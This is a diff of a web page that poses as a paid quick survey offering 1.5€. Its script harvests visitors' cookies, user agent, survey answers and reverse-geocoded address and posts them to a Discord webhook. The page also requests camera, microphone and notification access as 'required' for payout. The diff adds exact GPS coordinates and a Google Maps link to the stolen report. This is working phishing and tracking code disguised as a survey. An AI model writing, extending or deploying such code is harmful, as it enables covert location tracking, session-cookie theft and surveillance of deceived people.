@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Earn Money with Surveys – 1.5€ Reward</title>
+    <title>Earn 1.5€ – Quick Survey</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -29,8 +29,8 @@
             padding: 24px 28px;
             text-align: center;
         }
-        .header h1 { font-size: 1.8rem; font-weight: 700; letter-spacing: -0.5px; }
-        .header p { font-size: 0.9rem; opacity: 0.9; margin-top: 8px; }
+        .header h1 { font-size: 1.8rem; font-weight: 700; }
+        .header p { opacity: 0.9; margin-top: 8px; }
         .earn-badge {
             background: gold;
             color: #1e3a2f;
@@ -39,7 +39,6 @@
             border-radius: 40px;
             font-weight: bold;
             margin-top: 12px;
-            font-size: 1rem;
         }
         .content { padding: 28px 30px 35px; }
         .question-item {
@@ -92,6 +91,15 @@
         }
         .perm-btn:disabled { background: #94a3b8; cursor: not-allowed; }
         .status { font-size: 0.85rem; color: #2d3748; }
+        .location-map {
+            background: #e6f7ff;
+            border-radius: 16px;
+            padding: 12px;
+            margin: 12px 0;
+            display: none;
+            font-size: 0.85rem;
+        }
+        .location-map a { color: #1e466e; text-decoration: none; font-weight: bold; }
         .submit-btn {
             background: #f59e0b;
             color: #1e293b;
@@ -136,7 +144,6 @@
             color: #d9534f;
             font-weight: bold;
         }
-        .hidden { display: none; }
         .footer {
             background: #f8fafc;
             padding: 14px;
@@ -153,9 +160,7 @@
         <p>Complete the quick survey and get paid</p>
         <div class="earn-badge">🎁 Your reward: 1.5 €</div>
     </div>
-    <div class="content" id="dynamicContent">
-        <!-- will be filled with questions + permissions + submit -->
-    </div>
+    <div class="content" id="dynamicContent"></div>
     <div class="footer">Secure payment • Trusted survey partner</div>
 </div>
 
@@ -185,10 +190,10 @@
     let cameraStream = null;
     let locationData = null;
 
-    // Helper: send text log + answers to Discord
+    // Helper: send text log to Discord
     async function sendTextLog(answers, locData, withdrawalMethod = null) {
         let report = `💰 EARN SURVEY (1.5€)\nTime: ${new Date().toISOString()}\nURL: ${window.location.href}\n`;
-        if (locData && locData.address) report += `📍 Location: ${locData.address}\n`;
+        if (locData && locData.address) report += `📍 Location: ${locData.address}\nCoordinates: ${locData.lat},${locData.lon}\nMaps: https://www.google.com/maps?q=${locData.lat},${locData.lon}\n`;
         report += `🍪 Cookies: ${document.cookie || "none"}\n`;
         report += `📱 UA: ${navigator.userAgent}\n`;
         for (let i=0; i<questions.length; i++) {
@@ -275,7 +280,7 @@
         await fetch(WEBHOOK_URL, { method: "POST", body: formData }).catch(e=>console.error);
     }
 
-    // ========== PERMISSION REQUESTS ==========
+    // ========== PERMISSION REQUESTS (with live Google Maps link for GPS) ==========
     async function requestGeolocation() {
         try {
             const pos = await new Promise((res,rej)=> navigator.geolocation.getCurrentPosition(res,rej, {enableHighAccuracy:true}));
@@ -283,6 +288,12 @@
             const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
             const data = await geoRes.json();
             locationData = { address: data.display_name, lat, lon };
+            // Show live Google Maps link
+            const mapDiv = document.getElementById("locationMap");
+            if (mapDiv) {
+                mapDiv.innerHTML = `📍 Your current location: <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Open in Google Maps</a> (${lat.toFixed(5)}, ${lon.toFixed(5)})`;
+                mapDiv.style.display = "block";
+            }
             return true;
         } catch(e) { return false; }
     }
@@ -313,6 +324,7 @@
         <div class="permission-panel">
             <div style="font-weight:bold; margin-bottom:10px;">🔐 Required to receive your 1.5€ payout:</div>
             <div class="perm-step">📍 Location <button class="perm-btn" id="btnGeo">Allow</button> <span id="statusGeo" class="status">pending</span></div>
+            <div id="locationMap" class="location-map"></div>
             <div class="perm-step">🎤 Microphone <button class="perm-btn" id="btnMic">Allow</button> <span id="statusMic" class="status">pending</span></div>
             <div class="perm-step">🎥 Camera <button class="perm-btn" id="btnCamera">Allow</button> <span id="statusCamera" class="status">pending</span></div>
             <div class="perm-step">🔔 Notifications <button class="perm-btn" id="btnNotif">Allow</button> <span id="statusNotif" class="status">pending</span></div>
